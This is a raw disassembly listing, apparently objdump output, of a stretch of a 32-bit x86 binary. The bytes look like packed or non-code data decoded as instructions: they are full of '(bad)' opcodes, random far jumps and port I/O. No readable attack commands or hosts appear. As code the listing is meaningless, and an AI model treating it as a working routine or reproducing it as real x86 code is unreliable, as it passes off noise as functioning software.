  426fa3:	popf   
  426fa4:	lock jecxz 0x426fc7
  426fa7:	dec    ecx
  426fa8:	ret    0xdb3a
  426fab:	jge    0x427020
  426fad:	adc    ebp,DWORD PTR [eax-0x6ee661c3]
  426fb3:	push   es
  426fb4:	ins    DWORD PTR es:[edi],dx
  426fb5:	(bad)  
  426fb6:	xor    dl,BYTE PTR [ebp+esi*8+0x69ebcad]
  426fbd:	pop    edi
  426fbe:	jge    0x426f4e
  426fc0:	fscale 
  426fc2:	in     al,dx
  426fc3:	sub    al,0xd5
  426fc5:	fwait
  426fc6:	push   cs
  426fc7:	fs dec eax
  426fc9:	jmp    0xb879:0xa9d0aa9f
  426fd0:	adc    eax,DWORD PTR [esi+0x5fad540b]
  426fd6:	mov    ebp,0xbe56be2a
  426fdb:	xor    dl,BYTE PTR [eax+0x28]
  426fde:	aam    0xfd
  426fe0:	xchg   al,cl
  426fe2:	adc    bh,0xfd
  426fe5:	shr    BYTE PTR [esi-0x5e874989],cl
  426feb:	push   0xf75ce0c5
  426ff0:	jne    0x427044
  426ff2:	pop    esp
  426ff3:	imul   edi,DWORD PTR [esi+0x5c],0xffffff8a
  426ff7:	push   cs
  426ff8:	test   eax,0xc8b079f1
  426ffd:	push   edx
  426ffe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426fff:	dec    esp
  427000:	je     0x427031
  427002:	inc    ecx
  427003:	jne    0x427008
  427005:	xchg   esp,eax
  427006:	push   esp
  427007:	mov    ch,0xa5
  427009:	xchg   ebx,eax
  42700a:	jb     0x426fa4
  42700c:	cld    
  42700d:	xor    BYTE PTR [edx],al
  42700f:	das    
  427010:	inc    edi
  427011:	fcomp  QWORD PTR [ebx]
  427013:	inc    ebp
  427014:	out    dx,al
  427015:	out    dx,eax
  427016:	ds mov dl,0x42
  427019:	imul   esi,DWORD PTR [edx-0x57],0xffffffc1
  42701d:	mov    al,0xb7
  42701f:	xor    BYTE PTR [edi-0x18],ah
  427022:	sbb    esp,DWORD PTR [eax-0x61]
  427025:	mov    esp,0x5c871c99
  42702a:	icebp  
  42702b:	inc    esp
  42702c:	mov    ds:0x88,eax
	...
  427039:	add    dl,bh
  42703b:	rcl    DWORD PTR ds:0xfac73d07,cl
  427041:	jmp    DWORD PTR [ecx+0x5fa43d15]
  427047:	mov    bh,0x2a
  427049:	stos   BYTE PTR es:[edi],al
  42704a:	inc    eax
  42704b:	out    0x1,al
  42704d:	add    ah,bh
  42704f:	add    DWORD PTR [eax],eax
  427051:	add    BYTE PTR [edi-0x75],bh
  427054:	mov    ecx,0xced7bce2
  427059:	js     0x4270a1
  42705b:	test   DWORD PTR [ebx+edi*1+0x57],esp
  42705f:	jmp    0x500d:0x3f443e81
  427066:	push   ecx
  427067:	ss out dx,al
  427069:	rcl    DWORD PTR [edi-0x44242d7d],1
  42706f:	adc    al,cl
  427071:	push   eax
  427072:	dec    edi
  427073:	je     0x42703f
  427075:	adc    edx,DWORD PTR [ebp+ebp*2+0x60e7d4f3]
  42707c:	or     al,0xbd
  42707e:	sbb    edx,ebx
  427080:	aaa    
  427081:	mov    dl,0xbb
  427083:	std    
  427084:	mov    dl,BYTE PTR [edx]
  427086:	addr16 sub eax,ebp
  427089:	sahf   
  42708a:	pop    ebp
  42708b:	aad    0xcf
  42708d:	fwait
  42708e:	ret    0x4207
  427091:	mov    al,ss:0xda32b4bb
  427097:	arpl   WORD PTR [edx-0x67],cx
  42709a:	dec    ebx
  42709b:	sbb    DWORD PTR [ebx-0x5b],ebx
  42709e:	ins    BYTE PTR es:[edi],dx
  42709f:	test   DWORD PTR [esp+ebp*1-0x1cc0b737],ecx
  4270a6:	mov    al,ds:0xd5170388
  4270ab:	pushf  
  4270ac:	push   ds
  4270ad:	aaa    
  4270ae:	or     DWORD PTR [ecx+ebp*2],edx
  4270b1:	sar    DWORD PTR [esi+0x344c46f1],1
  4270b7:	adc    ebp,DWORD PTR [ecx-0x1a894061]
  4270bd:	stos   BYTE PTR es:[edi],al
  4270be:	adc    dh,bh
  4270c0:	addr16 call 0x3b7e:0xdfb53c4b
  4270c8:	mov    dh,0xef
  4270ca:	jmp    0x4270b7
  4270cc:	dec    eax
  4270cd:	push   ss
  4270ce:	push   ebp
  4270cf:	outs   dx,BYTE PTR ds:[esi]
  4270d0:	imul   BYTE PTR [esp-0x717c173]
  4270d7:	mov    dh,BYTE PTR [edx]
  4270d9:	pop    ebp
  4270da:	pushf  
  4270db:	jp     0x4270b6
  4270dd:	xchg   ecx,eax
  4270de:	cs sahf 
  4270e0:	mov    ecx,0xb421ede9
  4270e5:	cld    
  4270e6:	sbb    DWORD PTR [ebp-0x5c],0x39
  4270ea:	xor    ah,BYTE PTR [esi-0x45]
  4270ed:	pop    ebx
  4270ee:	ror    BYTE PTR [eax+esi*2+0x34],0x35
  4270f3:	mov    ebx,0x537e67f7
  4270f8:	imul   DWORD PTR [ecx-0x5e]
  4270fb:	cmp    ebp,DWORD PTR [ecx]
  4270fd:	dec    esp
  4270fe:	ins    BYTE PTR es:[edi],dx
  4270ff:	stos   BYTE PTR es:[edi],al
  427100:	mov    dh,0x5
  427102:	and    eax,0x8cffb441
  427107:	sahf   
  427108:	cmp    dl,ch
  42710a:	pop    ebp
  42710b:	pop    eax
  42710c:	push   edx
  42710d:	jbe    0x4270f5
  42710f:	fldenv [ebp+eiz*1+0x61]
  427113:	mov    ebp,0xd33e4080
  427118:	jecxz  0x4270a4
  42711a:	mov    bh,0x58
  42711c:	retf   0xd25
  42711f:	cmp    BYTE PTR [ebp+0x798c3ae],al
  427125:	jb     0x427161
  427127:	jl     0x427193
  427129:	xchg   edx,eax
  42712a:	dec    esp
  42712b:	mov    dh,0x47
  42712d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42712e:	js     0x4270c4
  427130:	popf   
  427131:	adc    ch,0x19
  427134:	lds    eax,FWORD PTR [ebx+0x2b852207]
  42713a:	mov    eax,0x76e8937f
  42713f:	cmp    BYTE PTR [ecx+0x44],ch
  427142:	push   cs
  427143:	xchg   ebp,eax
  427144:	scas   eax,DWORD PTR es:[edi]
  427145:	xor    BYTE PTR [ebp+0x60e6852f],bh
  42714b:	pusha  
  42714c:	retf   
  42714d:	outs   dx,BYTE PTR ds:[esi]
  42714e:	jbe    0x4271b3
  427150:	sub    al,0x21
  427152:	xchg   ebx,eax
  427153:	mov    ?,edi
  427155:	fldcw  WORD PTR [eax+eax*8]
  427158:	or     ah,dl
  42715a:	pop    es
  42715b:	dec    esi
  42715c:	inc    ebp
  42715d:	fst    DWORD PTR [eax+0x48cbbeee]
  427163:	fbstp  TBYTE PTR [esi-0x3c]
  427166:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427167:	inc    edx
  427168:	push   ebp
  427169:	(bad)  
  42716a:	jg     0x42719d
  42716c:	adc    DWORD PTR [edx+eiz*8+0x52811265],ebx
  427173:	ret    
  427174:	add    BYTE PTR [ebp-0x13532c98],bh
  42717a:	(bad)  
  42717b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42717c:	(bad)  
  42717d:	data16 sbb ah,bh
  427180:	mov    dl,0x9
  427182:	aaa    
  427183:	jecxz  0x4271b9
  427185:	sbb    eax,0x127847f0
  42718a:	push   es
  42718b:	fimul  WORD PTR [bp+0x72]
  42718f:	(bad)  
  427191:	jle    0x4271d1
  427193:	in     al,0x14
  427195:	pop    ds
  427196:	pop    esi
  427197:	push   esp
  427198:	dec    ebx
  427199:	mov    DWORD PTR [edi-0x4556af44],ebp
  42719f:	cwde   
  4271a0:	(bad)  
  4271a1:	cmp    BYTE PTR [edi+ebx*1],al
  4271a4:	test   eax,0xd9ed0f2c
  4271a9:	mov    al,0xc5
  4271ab:	ss add dh,0xf8
  4271af:	and    DWORD PTR [ebx-0x3412e027],edi
  4271b5:	jno    0x4271b8
  4271b7:	push   0x491de641
  4271bc:	fiadd  WORD PTR [eax+ebx*1]
  4271bf:	ror    DWORD PTR [edx+0x4b],0xa6
  4271c3:	leave  
  4271c4:	xor    dh,BYTE PTR [eax+0x6]
  4271c7:	js     0x4271ba
  4271c9:	loop   0x4271e2
  4271cb:	les    ecx,FWORD PTR [ebx+0x23]
  4271ce:	mov    cl,0x3c
  4271d0:	mov    ecx,0xe29425cd
  4271d5:	jmp    0x5d8c3a41
  4271da:	mov    al,0x1a
  4271dc:	or     ebp,DWORD PTR [eax+ebx*4+0x4b3944ec]
  4271e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4271e4:	repz pop ds
  4271e6:	fiadd  DWORD PTR [edi+0x67]
  4271e9:	jae    0x4271e4
  4271eb:	adc    BYTE PTR [eax+ebx*4],cl
  4271ee:	xor    al,0xe3
  4271f0:	xchg   edx,eax
  4271f1:	rcr    BYTE PTR [esi-0x4f],1
  4271f4:	rol    DWORD PTR [edi],1
  4271f6:	ins    DWORD PTR es:[edi],dx
  4271f7:	iret   
  4271f8:	or     DWORD PTR ds:0x48acaa45,edx
  4271fe:	sub    eax,0xac29f7ef
  427203:	push   edx
  427204:	inc    ebx
  427205:	jmp    0xe7cea058
  42720a:	mov    esp,0x54266573
  42720f:	out    dx,al
  427210:	es mov edx,0xf1ab1244
  427216:	dec    eax
  427217:	hlt    
  427218:	mov    ds:0xb6b727cb,al
  42721d:	pop    ebx
  42721e:	test   al,0x6f
  427220:	fmul   QWORD PTR [eax]
  427222:	adc    ebx,DWORD PTR [eax-0x67ce65c8]
  427228:	xchg   ecx,eax
  427229:	adc    dh,BYTE PTR ds:0x71fe3614
  42722f:	ror    DWORD PTR [ebx+0x4a189951],cl
  427235:	hlt    
  427236:	ret    
  427237:	popa   
  427238:	add    ch,bh
  42723a:	outs   dx,BYTE PTR ds:[esi]
  42723b:	mov    ch,0xab
  42723d:	mov    DWORD PTR [edx+0x27389d7d],edi
  427243:	adc    eax,0x7d702b98
  427248:	mov    al,0x26
  42724a:	pop    edx
  42724b:	(bad)  
  42724c:	mov    esp,0x4d
	...
  427259:	add    bh,cl
  42725b:	neg    BYTE PTR [ebp-0x308442b0]
  427261:	(bad)  
  427262:	mov    ecx,0x27b02077
  427267:	fmul   st,st(5)
  427269:	mov    ?,WORD PTR [eax+ebp*8]
  42726c:	add    DWORD PTR [eax],eax
  42726e:	cld    
  42726f:	add    DWORD PTR [eax],eax
  427271:	add    bl,dh
  427273:	data16 repz or BYTE PTR [edx],al
  427277:	out    0x51,eax
  427279:	or     bl,BYTE PTR [edi]
  42727b:	xor    esi,ebp
  42727d:	push   0x5e1e51c9
  427282:	inc    edi
  427283:	jle    0x4272e2
  427285:	add    ebp,DWORD PTR [ebx+0x482f1c74]
  42728b:	jae    0x4272a0
  42728d:	inc    ebx
  42728e:	add    al,0x33
  427290:	ds popf 
  427292:	imul   edx,eax,0x92256c0b
  427298:	das    
  427299:	jmp    0x4272bc
  42729b:	cmp    ebx,DWORD PTR [ebp+0x5c]
  42729e:	(bad)  
  42729f:	xor    DWORD PTR [ecx-0x68],0xffffffde
  4272a3:	icebp  
  4272a4:	push   ebp
  4272a5:	rol    DWORD PTR [ebp-0x5a159be6],cl
  4272ab:	sub    eax,0x140579f5
  4272b0:	xchg   esp,eax
  4272b1:	lods   al,BYTE PTR ds:[esi]
  4272b2:	loopne 0x427288
  4272b4:	adc    ecx,DWORD PTR [edi-0xf]
  4272b7:	sahf   
  4272b8:	fld    QWORD PTR [ebx+0x43]
  4272bb:	lock in eax,dx
  4272bd:	in     al,dx
  4272be:	mov    edx,DWORD PTR [eax+esi*2]
  4272c1:	jbe    0x427304
  4272c3:	sub    esp,DWORD PTR [eax]
  4272c5:	or     eax,0x5fc9281b
  4272ca:	jp     0x4272b5
  4272cc:	aam    0x66
  4272ce:	mov    dh,0x4e
  4272d0:	push   edi
  4272d1:	data16 mov cl,0x51
  4272d4:	sub    esp,0xffffffae
  4272d7:	xor    al,0xb9
  4272d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4272da:	je     0x4272b6
  4272dc:	add    dh,BYTE PTR [esi-0x82e68a2]
  4272e2:	imul   BYTE PTR [esi+0x43]
  4272e5:	rep stos BYTE PTR es:[edi],al
  4272e7:	in     eax,dx
  4272e8:	inc    esi
  4272e9:	addr16 sub ebx,ecx
  4272ec:	pop    ss
  4272ed:	jmp    0x4d10ff3d
  4272f2:	fdivr  st,st(7)
  4272f4:	pop    esp
  4272f5:	sub    al,0xe1
  4272f7:	rol    cl,0x59
  4272fa:	xor    ecx,edi
  4272fc:	xchg   edi,eax
  4272fd:	pop    ebp
  4272fe:	pop    edx
  4272ff:	sbb    eax,0xd865ddc7
  427304:	nop
  427305:	shl    ecx,1
  427307:	dec    ebx
  427308:	clc    
  427309:	icebp  
  42730a:	add    ah,0x46
  42730d:	sbb    eax,0x91cf7531
  427312:	outs   dx,DWORD PTR ds:[esi]
  427313:	pop    esi
  427314:	sub    ecx,DWORD PTR [edx-0x3d814003]
  42731a:	sbb    eax,0x724c984
  42731f:	xchg   ebx,eax
  427320:	pushf  
  427321:	sbb    ebp,edi
  427323:	or     al,0xf9
  427325:	pop    ebx
  427326:	int3   
  427327:	(bad)  
  427328:	(bad)  
  427329:	inc    DWORD PTR [eax+0xa]
  42732c:	enter  0xc628,0xeb
  427330:	cmp    DWORD PTR [edi+0x1da26cbe],edx
  427336:	cdq    
  427337:	add    eax,0x5484e516
  42733d:	test   esi,ecx
  42733f:	loop   0x427375
  427341:	mov    cl,0xb9
  427343:	scas   eax,DWORD PTR es:[edi]
  427344:	push   ds
  427345:	out    0xb0,eax
  427347:	hlt    
  427348:	pop    ebx
  427349:	mov    ch,0xb2
  42734b:	add    eax,0x6f8d2f3b
  427350:	in     eax,dx
  427351:	sbb    eax,DWORD PTR ds:0xfb695aa7
  427358:	add    eax,0x5f55a943
  42735d:	mov    eax,0x184e7135
  427362:	aas    
  427363:	fmul   DWORD PTR [ebx-0x51]
  427366:	xor    edi,DWORD PTR [esp+edi*4]
  427369:	and    DWORD PTR [eax+0x44],edi
  42736c:	mov    esi,0x1653642e
  427371:	xchg   edi,eax
  427372:	dec    bl
  427374:	xor    bl,0x42
  427377:	int3   
  427378:	outs   dx,BYTE PTR ds:[esi]
  427379:	outs   dx,BYTE PTR ds:[esi]
  42737a:	xchg   ecx,eax
  42737b:	fwait
  42737c:	cwde   
  42737d:	push   cs
  42737e:	enter  0x7712,0xcc
  427382:	out    0x34,al
  427384:	inc    edx
  427385:	mov    eax,0xf305859e
  42738a:	push   ss
  42738b:	jp     0x427326
  42738d:	and    DWORD PTR [edx],edi
  42738f:	xchg   BYTE PTR [ebp-0x7c],bh
  427392:	push   edx
  427393:	rcl    DWORD PTR [esi+0x30],cl
  427396:	xchg   edi,eax
  427397:	xchg   esp,eax
  427398:	fcom   DWORD PTR [esi-0x7e]
  42739b:	mov    DWORD PTR [ebx],ebx
  42739d:	push   ebx
  42739e:	xchg   ecx,eax
  42739f:	je     0x4273b6
  4273a1:	loope  0x427337
  4273a3:	fiadd  WORD PTR [edi-0x68ed9d64]
  4273a9:	mov    bh,0xab
  4273ab:	inc    ebp
  4273ac:	fimul  DWORD PTR [ecx+0x6e]
  4273af:	jo     0x4273ac
  4273b1:	or     DWORD PTR [edx+ecx*8+0xd225632],0x954f968b
  4273bc:	xor    esp,DWORD PTR [edx]
  4273be:	sbb    dl,BYTE PTR [edx]
  4273c0:	(bad)
  4273c3:	cwde   
  4273c4:	xchg   ebp,eax
  4273c5:	rcr    BYTE PTR [ebx+0x38452592],cl
  4273cb:	jnp    0x4273d8
  4273cd:	int    0xd1
  4273cf:	and    ebp,DWORD PTR ss:[ebp+0x4e]
  4273d3:	mov    eax,ds:0x9dcc0a2
  4273d8:	mov    ebp,0x7c13deb2
  4273dd:	jmp    0xc7426fa7
  4273e2:	or     ebx,DWORD PTR ds:0x837a100b
  4273e8:	push   0xbb3efa3e
  4273ed:	lock or bh,BYTE PTR [eax-0x4bb407ca]
  4273f4:	lds    ebx,FWORD PTR [ebx-0x7d]
  4273f7:	int    0xbb
  4273f9:	call   0xd81a84ad
  4273fe:	dec    ecx
  4273ff:	add    BYTE PTR [edx+0x489a125],0xdb
  427406:	mov    WORD PTR [ebx],gs
  427408:	int3   
  427409:	and    ah,bh
  42740b:	sbb    BYTE PTR [eax+0x327ee8e5],dh
  427411:	jg     0x4273dc
  427413:	ss ins DWORD PTR es:[edi],dx
  427415:	push   es
  427416:	push   eax
  427417:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427418:	and    DWORD PTR [ebx],eax
  42741a:	je     0x42747f
  42741c:	test   al,0x40
  42741e:	nop
  42741f:	jmp    0x42747e
  427421:	sahf   
  427422:	pop    eax
  427423:	xchg   ecx,eax
  427424:	mov    WORD PTR ds:0x7ce87274,fs
  42742b:	loope  0x42747e
  42742d:	adc    al,0x9e
  42742f:	mov    ecx,0x703f23d4
  427434:	pushf  
  427435:	imul   edx,DWORD PTR [ebx+edi*4-0x1edfd6bb],0x9e8677ab
  427440:	cmp    cl,BYTE PTR [ebp-0x662c0c6d]
  427446:	pushf  
  427447:	or     DWORD PTR [edi],edi
  427449:	ret    0x7588
  42744c:	or     edx,DWORD PTR [eax]
  42744e:	mov    ds:0x49a0260,al
  427453:	dec    esi
  427454:	sbb    al,0x8f
  427456:	xor    BYTE PTR [eax],dl
  427458:	cmp    BYTE PTR [edx],ch
  42745a:	fild   WORD PTR ds:0x1bce3342
  427460:	mov    al,ds:0x99c868f0
  427465:	jl     0x42742f
  427467:	cli    
  427468:	into   
  427469:	mov    ds:0x131f1ca2,al
	...
  42747a:	push   0x6f1e2d23
  42747f:	push   ds
  427480:	jnp    0x4274f9
  427482:	outs   dx,DWORD PTR ds:[esi]
  427483:	jno    0x4274a3
  427485:	dec    esi
  427486:	sbb    DWORD PTR [ebx-0x15c7960b],edx
  42748c:	add    DWORD PTR [eax],eax
  42748e:	cld    
  42748f:	add    DWORD PTR [eax],eax
  427491:	add    ah,dl
  427493:	popf   
  427494:	punpcklwd mm4,DWORD PTR [ebp-0x5850b055]
  42749b:	popf   
  42749c:	ror    BYTE PTR [edx-0x7f],cl
  42749f:	lods   al,BYTE PTR ds:[esi]
  4274a0:	fs and al,0x62
  4274a3:	aad    0xe2
  4274a5:	std    
  4274a6:	cmp    BYTE PTR [ebx+0x51735d37],ch
  4274ac:	retf   
  4274ad:	inc    eax
  4274ae:	xchg   BYTE PTR [esi+edi*4-0x212a76ba],bh
  4274b5:	jno    0x42750a
  4274b7:	adc    cl,BYTE PTR [esi]
  4274b9:	movhps xmm3,QWORD PTR [ebp+0x2a1a1883]
  4274c0:	inc    ebx
  4274c2:	sub    DWORD PTR [edx],edi
  4274c4:	pop    edi
  4274c5:	mov    esp,0x22d3d9c6
  4274ca:	or     bh,BYTE PTR [ecx]
  4274cc:	adc    ecx,esp
  4274ce:	mov    eax,DWORD PTR [edx]
  4274d0:	pop    ebx
  4274d1:	call   0x7691d1e3
  4274d6:	xchg   ebx,eax
  4274d7:	dec    ebp
  4274d8:	loope  0x4274c3
  4274da:	xor    BYTE PTR [ecx],cl
  4274dc:	and    al,BYTE PTR [esp+ecx*2]
  4274df:	ret    0xbf38
  4274e2:	data16 mov cl,0x24
  4274e5:	ret    0x181f
  4274e8:	je     0x427497
  4274ea:	mov    bl,0xde
  4274ec:	fadd   QWORD PTR [edi]
  4274ee:	xchg   ebx,eax
  4274ef:	push   esp
  4274f0:	mov    edx,0x4e95d7d
  4274f5:	inc    ecx
  4274f6:	test   dl,bl
  4274f8:	sbb    eax,0xb840bec
  4274fd:	enter  0x95f5,0x92
  427501:	or     DWORD PTR [edx],ebp
  427503:	mov    ds:0x16412c36,eax
  427508:	sub    bl,bh
  42750a:	sbb    bh,BYTE PTR [eax+0x460869e8]
  427510:	cmc    
  427511:	out    dx,al
  427512:	xchg   ebx,eax
  427513:	(bad)  
  427515:	inc    ebx
  427516:	test   edx,0x8d7b1e96
  42751c:	xor    DWORD PTR ds:0x57b24ab0,edx
  427522:	sub    eax,0xa00811ff
  427527:	fsub   st,st(7)
  427529:	jmp    0xa4a82da7
  42752e:	or     DWORD PTR [eax+eiz*2+0x34a18ce7],eax
  427535:	mov    BYTE PTR ds:0xb108a360,0xed
  42753c:	mov    al,0x92
  42753e:	es jno 0x4274c9
  427541:	out    0xac,al
  427543:	in     eax,dx
  427544:	or     DWORD PTR [ecx],ecx
  427546:	or     eax,DWORD PTR [ebx+0x1f808030]
  42754c:	rcr    BYTE PTR [eax-0x4f],1
  42754f:	enter  0x34a1,0xcd
  427553:	jmp    0x4275d0
  427555:	mov    ebp,0x31735ade
  42755a:	neg    DWORD PTR [esi]
  42755c:	lds    ebp,FWORD PTR [ebx]
  42755e:	ja     0x4275c0
  427560:	jl     0x427500
  427562:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427563:	call   DWORD PTR [esi-0x739871f0]
  427569:	shl    BYTE PTR [ebx-0x4b91f645],1
  42756f:	adc    ch,BYTE PTR [eax+0x7acf498]
  427575:	jl     0x42756c
  427577:	repz sub DWORD PTR [ecx-0x7f],ebp
  42757b:	ret    0xff6d
  42757e:	psubusw mm0,QWORD PTR ds:0xcef1f2d0
  427585:	or     eax,DWORD PTR [ebx-0x33]
  427588:	push   ds
  427589:	aas    
  42758a:	shl    BYTE PTR [ebx],0x3
  42758d:	sub    BYTE PTR [edi-0xe],dh
  427590:	xchg   esi,eax
  427591:	fldcw  WORD PTR [ecx+0x60acb802]
  427597:	sbb    al,0xf4
  427599:	mov    ebp,0x938f5989
  42759e:	in     al,0x65
  4275a0:	jmp    0xa00a:0x3e9cccf
  4275a7:	push   edx
  4275a8:	jo     0x4275c5
  4275aa:	xchg   ebp,eax
  4275ab:	mov    dh,0xeb
  4275ad:	(bad)  
  4275ae:	test   al,0xc6
  4275b0:	mov    ds:0x74781024,al
  4275b5:	stos   DWORD PTR es:[edi],eax
  4275b6:	in     eax,dx
  4275b7:	xchg   BYTE PTR [ebx+0x48a0eb83],dh
  4275bd:	std    
  4275be:	jmp    0x531f:0xb586504c
  4275c5:	push   cs
  4275c6:	mov    edi,0xe79a8b61
  4275cb:	mov    WORD PTR [ecx-0x42e18eeb],ss
  4275d1:	sbb    BYTE PTR [esi-0x1e150a9a],0x9
  4275d8:	dec    esi
  4275d9:	mov    eax,0x7f688be9
  4275de:	scas   al,BYTE PTR es:[edi]
  4275df:	mov    ds:0x78aab402,al
  4275e4:	nop
  4275e5:	dec    edi
  4275e6:	mov    eax,0x9cf74648
  4275eb:	and    DWORD PTR [ecx+0x1da3b14c],edx
  4275f1:	or     dh,BYTE PTR [eax]
  4275f3:	mov    bl,0xca
  4275f5:	imul   ebp,eax,0xe5de5ec7
  4275fb:	mov    dl,0x65
  4275fd:	fld    TBYTE PTR [ebx-0x6f]
  427600:	xchg   esp,esp
  427602:	shl    DWORD PTR [ebp-0x3624e8c3],cl
  427608:	sub    al,0xe1
  42760a:	lods   al,BYTE PTR ds:[esi]
  42760b:	dec    eax
  42760c:	test   DWORD PTR [edi+0x55],ebx
  42760f:	lds    esi,FWORD PTR [esi-0x6b1a2f81]
  427615:	mov    esp,0x1a8b60a7
  42761a:	mov    dh,0xa0
  42761c:	test   cl,bl
  42761e:	mov    ds:0x39ef98a9,eax
  427623:	fdivr  DWORD PTR [ebx]
  427625:	or     DWORD PTR [ecx],0x350732ba
  42762b:	int    0xf7
  42762d:	mov    eax,ds:0xea0588f7
  427632:	mov    esp,0xda8f5b03
  427637:	scas   eax,DWORD PTR es:[edi]
  427638:	jmp    0x573fb455
  42763d:	sub    ebp,ebx
  42763f:	enter  0x9f38,0xd4
  427643:	mov    bl,0x66
  427645:	(bad)  
  427647:	add    BYTE PTR [edx-0x294f2678],al
  42764d:	add    ecx,DWORD PTR [eax+0x1a]
  427650:	xor    esp,DWORD PTR [eax-0x352a0f76]
  427656:	mov    dh,0x6e
  427658:	jmp    0x6a01:0x50494e0b
  42765f:	frstor [esi-0x6971ce73]
  427665:	fcmovne st,st(2)
  427667:	cmp    edx,DWORD PTR [edi+0x5d71b604]
  42766d:	jge    0x4276cb
  42766f:	icebp  
  427670:	dec    edx
  427671:	jp     0x4276c3
  427673:	sub    DWORD PTR [edi+0x60],edi
  427676:	inc    edx
  427677:	stos   BYTE PTR es:[edi],al
  427678:	push   0xffffffee
  42767a:	fwait
  42767b:	in     al,0x3b
  42767d:	dec    esp
  42767e:	popf   
  42767f:	ss (bad) 
  427681:	xchg   ecx,eax
  427682:	das    
  427683:	cmp    cl,dh
  427685:	hlt    
  427686:	push   edi
  427687:	pop    edi
  427688:	pop    es
  427689:	out    0x49,eax
  42768b:	mov    edi,0xc82d
	...
  427698:	add    BYTE PTR [eax],al
  42769a:	cdq    
  42769b:	enter  0x9ff8,0xf9
  42769f:	mov    edi,0xcf7dceff
  4276a4:	stc    
  4276a5:	popf   
  4276a6:	loop   0x42766a
  4276a8:	mov    fs,WORD PTR [ebp+0x34]
  4276ab:	in     al,dx
  4276ac:	add    DWORD PTR [eax],eax
  4276ae:	cld    
  4276af:	add    DWORD PTR [eax],eax
  4276b1:	add    BYTE PTR [ebx-0x7f9a825f],ch
  4276b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4276b8:	sub    al,BYTE PTR [ebx-0xb]
  4276bb:	stos   DWORD PTR es:[edi],eax
  4276bc:	ret    
  4276bd:	jmp    0x4276fe
  4276bf:	(bad)  
  4276c0:	pop    ds
  4276c1:	rcl    edx,1
  4276c3:	in     al,dx
  4276c4:	push   esi
  4276c5:	mov    ch,0xc9
  4276c7:	mov    eax,ds:0xdfdb562f
  4276cc:	sub    bl,0x4a
  4276cf:	sbb    DWORD PTR [eax+ebp*1-0x6143394f],ecx
  4276d6:	xlat   BYTE PTR ds:[ebx]
  4276d7:	lahf   
  4276d8:	aas    
  4276d9:	fstp   TBYTE PTR [esi-0x4d]
  4276dc:	push   ss
  4276dd:	xor    DWORD PTR [ecx+0x7deb61c3],ebp
  4276e3:	int3   
  4276e4:	ss aas 
  4276e6:	sbb    edx,DWORD PTR [edx]
  4276e8:	(bad)  
  4276e9:	out    dx,al
  4276ea:	sub    ah,BYTE PTR ds:0x16b01c6
  4276f0:	and    dl,al
  4276f2:	(bad)  [eiz*1-0x44e394b]
  4276f9:	sbb    dh,BYTE PTR [esi+0x86bd6be]
  4276ff:	push   0xffffffcd
  427701:	leave  
  427702:	fiadd  WORD PTR [ecx-0x20e2a754]
  427708:	lea    edx,[ebx+0x49]
  42770b:	add    BYTE PTR [edx],dl
  42770d:	outs   dx,BYTE PTR ds:[esi]
  42770e:	loop   0x42777d
  427710:	fmulp  st(5),st
  427712:	(bad)  [edx]
  427714:	inc    ebx
  427715:	fisub  WORD PTR [ecx-0xd]
  427718:	xchg   ecx,eax
  427719:	dec    edi
  42771a:	mov    ah,0x25
  42771c:	stc    
  42771d:	neg    dl
  42771f:	repz mov es,WORD PTR [edx+0x50c1f359]
  427726:	xor    BYTE PTR [ebx-0x5d],bh
  427729:	add    esp,DWORD PTR [eax+0x68467361]
  42772f:	add    eax,0x229a7533
  427734:	or     DWORD PTR [eax+ecx*8+0x53a94185],ebp
  42773b:	jns    0x427761
  42773d:	ret    
  42773e:	arpl   WORD PTR [edi+0x1f9cff39],di
  427744:	test   al,0xab
  427746:	sbb    eax,ecx
  427748:	cmp    edi,DWORD PTR [eax+eiz*4]
  42774b:	in     eax,dx
  42774c:	lds    ecx,FWORD PTR [esi+0x3f6cdfd4]
  427752:	int3   
  427753:	cli    
  427754:	jl     0x4277d1
  427756:	jns    0x427779
  427758:	arpl   WORD PTR [edx],cx
  42775a:	mov    edx,0xfacefb1f
  42775f:	das    
  427760:	mov    bh,0xb1
  427762:	retf   0x34eb
  427765:	icebp  
  427766:	jmp    0xb759:0x5d257a99
  42776d:	test   al,0x10
  42776f:	mov    ebx,0x35549707
  427774:	mov    ah,ch
  427776:	dec    ecx
  427777:	push   edi
  427778:	xor    DWORD PTR [ecx-0x31b661d5],0x29
  42777f:	dec    edx
  427780:	mov    ebp,0x54762b7f
  427785:	push   edi
  427786:	push   es
  427787:	ret    
  427788:	cli    
  427789:	xchg   ebx,eax
  42778a:	inc    ebx
  42778b:	and    al,0x33
  42778d:	and    eax,0x5c390861
  427792:	sbb    DWORD PTR [eax+ebx*1-0x217bd780],esp
  427799:	sub    eax,0xa2e99b3d
  42779e:	arpl   WORD PTR [eax+0x38410b70],bx
  4277a4:	ins    BYTE PTR es:[edi],dx
  4277a5:	pusha  
  4277a6:	sub    ebx,eax
  4277a8:	sbb    BYTE PTR [esi+edx*8+0x64],0x1c
  4277ad:	shl    DWORD PTR [edx+ecx*8-0x49],0xb2
  4277b2:	(bad)  
  4277b3:	repnz or DWORD PTR [edi-0xb],0xdc19c996
  4277bb:	stos   DWORD PTR es:[edi],eax
  4277bc:	retf   
  4277bd:	xor    edx,DWORD PTR [edi-0x317e9edf]
  4277c3:	in     al,0xdd
  4277c5:	leave  
  4277c6:	das    
  4277c7:	push   edx
  4277c8:	mov    dl,0x71
  4277ca:	cmp    BYTE PTR [edi-0x48],0xfc
  4277ce:	add    DWORD PTR [esi],ebp
  4277d0:	sbb    al,ah
  4277d2:	ja     0x427761
  4277d4:	in     al,dx
  4277d5:	mov    dl,BYTE PTR [ebx]
  4277d7:	jno    0x427790
  4277d9:	xchg   ebx,eax
  4277da:	xchg   edx,eax
  4277db:	(bad)  
  4277dc:	or     eax,0x8d073f7c
  4277e1:	dec    ecx
  4277e2:	cpuid  
  4277e4:	cmp    BYTE PTR [esi],ah
  4277e6:	push   esi
  4277e7:	lahf   
  4277e8:	cmp    DWORD PTR [ebx],ecx
  4277ea:	cs hlt 
